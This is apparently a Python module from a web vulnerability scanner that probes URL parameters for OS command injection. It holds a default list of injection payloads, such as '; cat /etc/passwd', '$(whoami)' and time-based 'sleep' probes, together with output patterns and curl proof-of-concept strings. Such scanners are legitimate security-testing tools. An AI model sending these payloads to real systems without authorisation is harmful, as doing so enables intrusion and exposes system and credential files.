"""
Command Injection Detection Module
OWASP A03:2021 - Injection
"""

import requests
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.payload_loader import payload_loader


class CommandInjectionModule:
    def __init__(self, target_url: str, custom_payloads: List[str] = None, http_client: Any = None):
        self.target_url = target_url
        
        # Inject custom HttpClient if provided
        if http_client:
            self.http = http_client
        else:
            import requests as r
            self.http = r
        
        # Default command injection payloads
        default_payloads = [
            # Unix/Linux
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            
            # Windows
            "& dir",
            "| dir",
            "&& dir",
            "& type C:\\windows\\win.ini",
            
            # Time-based
            "; sleep 5",
            "| sleep 5",
            "& timeout 5",
            
            # Blind injection
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
        ]
        
        self.payloads = payload_loader.merge_with_defaults(
            default_payloads,
            custom_payloads or []
        )
        
        # Detection patterns
        self.unix_patterns = ['root:', 'bin/bash', 'usr/bin', 'etc/passwd']
        self.windows_patterns = ['[extensions]', 'C:\\', 'Windows', 'System32']
        self.command_patterns = ['uid=', 'gid=', 'groups=']
        
    def test_command_injection(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Test parameter for command injection"""
        findings = []
        
        try:
            # Get baseline
            baseline = self.http.get(url, timeout=10)
            baseline_length = len(baseline.text)
            
            for payload in self.payloads:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                
                response = self.http.get(test_url, timeout=15)
                
                # Check for command output patterns
                found_pattern = None
                for pattern in self.unix_patterns + self.windows_patterns + self.command_patterns:
                    if pattern in response.text:
                        found_pattern = pattern
                        break
                
                if found_pattern:
                    findings.append({
                        "name": "OS Command Injection",
                        "vulnerability_type": "command_injection",
                        "severity": "critical",
                        "owasp_category": "A03:2021",
                        "url": url,
                        "parameter": param,
                        "confidence": 95,
                        "technique": "Command Injection",
                        "evidence": {
                            "payload": payload,
                            "pattern_found": found_pattern,
                            "response_snippet": response.text[:300]
                        },
                        "poc": f"curl -X GET \"{test_url}\"",
                        "remediation": "Never pass user input directly to system commands. Use allowlists and input validation."
                    })
                    break
                    
                # Check for time-based injection
                if 'sleep' in payload or 'timeout' in payload:
                    if response.elapsed.total_seconds() > 4:
                        findings.append({
                            "name": "Blind Command Injection (Time-based)",
                            "vulnerability_type": "command_injection",
                            "severity": "critical",
                            "owasp_category": "A03:2021",
                            "url": url,
                            "parameter": param,
                            "confidence": 80,
                            "technique": "Time-based Blind",
                            "evidence": {
                                "payload": payload,
                                "response_time": response.elapsed.total_seconds()
                            },
                            "poc": f"curl -X GET \"{test_url}\"",
                            "remediation": "Never pass user input directly to system commands"
                        })
                        break
                        
        except Exception as e:
            print(f"Error testing command injection: {str(e)}")
            
        return findings
        
    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Scan for command injection vulnerabilities"""
        all_findings = []
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                findings = self.test_command_injection(url, param)
                all_findings.extend(findings)
                
        return all_findings
